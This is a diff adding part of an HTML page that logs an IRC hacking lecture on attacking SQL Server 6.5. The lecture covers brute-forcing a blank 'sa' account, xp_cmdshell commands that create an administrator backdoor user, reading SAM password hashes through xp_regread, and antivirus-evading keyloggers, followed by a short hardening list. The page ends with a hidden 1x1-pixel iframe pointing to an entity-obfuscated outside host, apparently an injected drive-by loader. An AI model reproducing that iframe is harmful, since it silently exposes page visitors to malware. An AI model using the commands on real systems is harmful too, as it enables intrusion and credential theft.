+server.
+<BR>&lt;Mikkkeee> one fault that is quite amusing is that sql sever doesn't
+not require a strong password.
+<BR>&lt;Mikkkeee> While we know this for a fact its is very trivial and
+at the same time eazy to use&nbsp; brute force attacks against the database
+<BR>&lt;Mikkkeee> server with nothing standing in our way that can prevent
+us from trying to break it to the highest lvl.
+<BR>&lt;Mikkkeee> -okay let me name one good brute forcer.
+<BR>&lt;Mikkkeee> goto packetstorm and search for sqlbf
+<BR>&lt;Mikkkeee> if there are any better ones then try those.
+<BR>&lt;Mikkkeee> Lets say you have cracked into the database, well once
+your in the game begins.
+<BR>&lt;Mikkkeee> lets start with system compromise by using extended procedure,
+for v6.5
+<BR>&lt;Mikkkeee> Many systems have very powerful feature
+<BR>&lt;Mikkkeee> s
+<BR>&lt;Mikkkeee> convieniet to DATABASES
+<BR>&lt;Mikkkeee> but are going to be our backdoors into the database server
+host.
+<BR>&lt;Mikkkeee> =usually many databases because of lazy admins have no
+password,
+<BR>&lt;Mikkkeee> this case the "sa" account, usually the admin is a lazy
+bum and has not put a password.
+<BR>*** pixel_chomp has quit IRC (Quit: type /quit newbie status to become
+an op)
+<BR>&lt;Mikkkeee> -so now anyway once we get the password our aim moves
+to takeing over the os, which usually is an nt box.
+<BR>&lt;AZTEK> hi-ho hi-ho its off to code i go
+<BR>*** AZTEK is now known as AZTEK[coding]
+<BR>&lt;Mikkkeee> hehe
+<BR>&lt;Mikkkeee> -by logging in as "sa" the attacker has the use of the
+extended stored procedure which is "xp_cmdshell",
+<BR>&lt;Mikkkeee> this will allows an sql server user or attacker to run
+an dos cammand as if he is that person running the cammand at the console.
+<BR>&lt;Mikkkeee> one thing the attacker can do
+<BR>&lt;Mikkkeee> is add a&nbsp; user into windows nt account
+<BR>&lt;Mikkkeee> and then can do it to the admin group.
+<BR>*** Artist has joined #bsrf
+<BR>&lt;Mikkkeee> to do this
+<BR>&lt;Mikkkeee> they would type
+<BR>&lt;Mikkkeee> :
+<BR>&lt;Mikkkeee> Xp_cmdshell'net user hacker 678re0 /ADD'
+<BR>&lt;Mikkkeee> now the attacker
+<BR>*** Shadow_Stalker has quit IRC (Quit: May the force be with you :-))
+<BR>&lt;Mikkkeee> just added a user hacker with the password 678re0
+<BR>&lt;Mikkkeee> hehe nice password.
+<BR>&lt;reptile> how cool
+<BR>&lt;reptile> wouldnt this be cracking?
+<BR>&lt;Mikkkeee> now lets add it to the administrators group.
+<BR>&lt;Mikkkeee> there in
+<BR>&lt;Mikkkeee> already they are backdooring the box
+<BR>&lt;Mikkkeee> they would type:
+<BR>&lt;Mikkkeee> Xp_cmdshell 'net localgroup /ADD Administrators hacker;
+<BR>&lt;Mikkkeee> haha now hacker has become an NT administrator,
+<BR>&lt;Mikkkeee> the reason this has worked is because the commnads are
+being sumbitted to the os using the nt account under which the sql server
+is being run,
+<BR>&lt;Mikkkeee> this is local system account
+<BR>&lt;Mikkkeee> which is the most powerful local account on the nt box.
+<BR>&lt;Mikkkeee> -Another very good attack is to compromise the nt box
+by reading the sam._ file
+<BR>&lt;Mikkkeee> under the winnt/repair/sam._&nbsp; and
+<BR>&lt;Mikkkeee> cracking the hashed password using the cracking tool
+<BR>&lt;Mikkkeee> l0phtCrack
+<BR>&lt;Mikkkeee> that tool is a work of art
+<BR>&lt;Mikkkeee> Lets do this then,
+<BR>&lt;Mikkkeee> we will need to use the exteded stored procedurer,
+<BR>&lt;Mikkkeee> xp_regread which is from the registry.
+<BR>&lt;Mikkkeee> so what are we waiting for lets get that little sam file.
+<BR>&lt;Mikkkeee> xp_regread'HKEY_LOCAL_MACHINE;,'SECURITY\SAM\DOMAINS\ACCOUNT'.'F
+<BR>&lt;Mikkkeee> we were going to read the passord out of the registry
+<BR>&lt;Mikkkeee> so now if your a lazy attacker
+<BR>&lt;Mikkkeee> you might want to use a canned tool, ahh let me name
+a good one, goto
+<BR>&lt;Mikkkeee> packetstrom and d/l SQLPOKE.
+<BR>&lt;Mikkkeee> now lets talk about other procedures
+<BR>&lt;Mikkkeee> -attacking the database/ gaining the password local compromise.
+<BR>&lt;Mikkkeee> well the sa password is stored in clear text
+<BR>&lt;Mikkkeee> so if you got local access goto
+<BR>&lt;Mikkkeee> HKEY_CURRENT_USER\SOFTWARE\MICROSHIT\ oops
+<BR>&lt;Mikkkeee> lol
+<BR>&lt;Mikkkeee> HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\MSSQLServe\SQLEW\REGISTERED
+SERVER\SQL 6.5
+<BR>&lt;reptile> mikkkeee is there a way to determine if a server is runnin
+SQL?
+<BR>*** elite has quit IRC (Quit: )
+<BR>&lt;Mikkkeee> above i talked about the scanner from&nbsp; eEye
+<BR>&lt;reptile> retina?
+<BR>&lt;Mikkkeee> yup
+<BR>&lt;reptile> that costs $30k dude
+<BR>*** Lone[Star] has joined #bsrf
+<BR>&lt;reptile> ;(
+<BR>&lt;Mikkkeee> haha pay
+<BR>&lt;Mikkkeee> lol
+<BR>&lt;Mikkkeee> the VER might be different well thats the path and the
+password is stored as clear txt so you shouldn't have a hard time to obtain
+it.
+<BR>&lt;Mikkkeee> - another attack if the system is not secured usually
+its not.
+<BR>&lt;Mikkkeee> one method is to scan the host for smb ports (tcp 139,
+udp, 137 and 138)
+<BR>&lt;Mikkkeee> nt uses them for smb ports to communicate.
+<BR>&lt;reptile> tankies
+<BR>&lt;Mikkkeee> these should be closed by a firewall but you can belucky.
+<BR>&lt;reptile> im off to writing a simple scanner for this
+<BR>&lt;Mikkkeee> to attack the nt box using this attack you can chk out
+rhino9
+<BR>&lt;reptile> ;)
+<BR>&lt;Mikkkeee> tutorial called "THE WINDOWS NT WARDOC, A STUDY IN REMOTE
+PENETRATION"/
+<BR>*** d3molisher has joined #bsrf
+<BR>&lt;Mikkkeee> i belive we got an nt tutorial at the tuts page in blacksun
+<BR>&lt;Mikkkeee> -well now you know that both usernames/passwords and
+<BR>&lt;reptile> Another good hole in very bad nt machines is the front
+page vti thing
+<BR>&lt;Mikkkeee> data is usually sent unencrypted so that means you guessed
+it can be sniffeed.
+<BR>*** Devil_Panther has quit IRC (Quit: LOL = Lamers On-Line (&reg;&copy;,
+and all the other lame legal shit))
+<BR>&lt;Mikkkeee> nice /quit msg
+<BR>&lt;Mikkkeee> yah the chances are slim
+<BR>&lt;Mikkkeee> like finding phf vul pages
+<BR>&lt;Mikkkeee> but you never know
+<BR>&lt;Mikkkeee> Another method is keyloggers,
+<BR>&lt;Mikkkeee> god blessssss the loggers
+<BR>&lt;angel> hi Mikkkeee:)))
+<BR>&lt;Mikkkeee> get a good one from www.keyloggers.com
+<BR>&lt;Mikkkeee> hey angel
+<BR>&lt;angel> whats up?
+<BR>&lt;Mikkkeee> the best one against nt is called i think stealth keyloger
+its the best&nbsp; well the sharewares ones kick ass. get those.
+<BR>&lt;Mikkkeee> usually the shareware ones are called legit loggers so
+i don't think AV scanners pick up those
+<BR>&lt;Mikkkeee> but they might
+<BR>&lt;Mikkkeee> .
+<BR>*** BaGeL has quit IRC (Quit: Twenty-two points, plus triple word score,
+plus 50 points for using all my letters. Game's over, I'm outta here. -Kwyjibo)
+<BR>&lt;Mikkkeee> now let me talk a little about securing and we can goto
+the other lecture
+<BR>&lt;Mikkkeee> well one thing you can do to protect your self if your
+running a dbs is to \:
+<BR>&lt;Mikkkeee> 1-click the encyption option,
+<BR>&lt;Mikkkeee> that isn't done by default so you got to do that in order
+to encytp it so that could make snifferes useless,
+<BR>&lt;Mikkkeee> 2- make sure your got a good firewall setup this is good
+for the smb ports and against the portscanners.
+<BR>&lt;Mikkkeee> 3-multi protocol
+<BR>&lt;Mikkkeee> will let you use random tcp ports by default or you can
+use fixed ports to ease firewall rulz.
+<BR>*** _acid519- has quit IRC (Ping timeout: 180 seconds)
+<BR>&lt;Mikkkeee> 4-if you can try to use muti protocol and enable encryption
+<BR>&lt;Mikkkeee> if not then try to use ip sockest,
+<BR>&lt;Mikkkeee> change the default ports and install some good firewall.
+<BR>*** Artist has quit IRC (Quit: Leaving)
+<BR>&lt;SpiderMan> Checkpoint Firewall-1 is a good choice
+<BR>&lt;Mikkkeee> 5-Use a&nbsp; COM component or a webserver,
+<BR>&lt;Mikkkeee> as the business obj layer.
+<BR>&lt;Mikkkeee> okay done
+<BR>&lt;Mikkkeee> any questions
+<BR>*** Mikkkeee sets mode: -m
+<BR>&lt;suspect> *clap *clap *clap *clap *clap *clap *clap *clap
+<BR>&lt;S7> nope
+<BR>&lt;Mikkkeee> if none reptile which are you going to do next?
+<BR>&lt;freakOVER[away]> VB!
+<BR>&lt;freakOVER[away]> :)
+<BR>*** freakOVER[away] is now known as freakOVER
+<BR>&lt;SySt3mShk> bv
+<BR>&lt;SySt3mShk> vb
+<BR>&lt;reptile> w00t
+<BR>&lt;SpiderMan> aw, AZTEK and I didn't get a nice thing like that
+<BR>&lt;TCL> nooooo! not VB!
+<BR>&lt;reptile> now
+<BR>&lt;freakOVER> :)
+<BR>&lt;reptile> what do u ppl wanna start with vb/mirc scripting?
+<BR>&lt;Mikkkeee> so if no questions this is the end of the sql lecture
+<BR>&lt;reptile> *clap *clap *clap *clap *clap *clap *clap *clap
+<BR>&lt;Mikkkeee> --------------------END OF LECTURE----------------
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
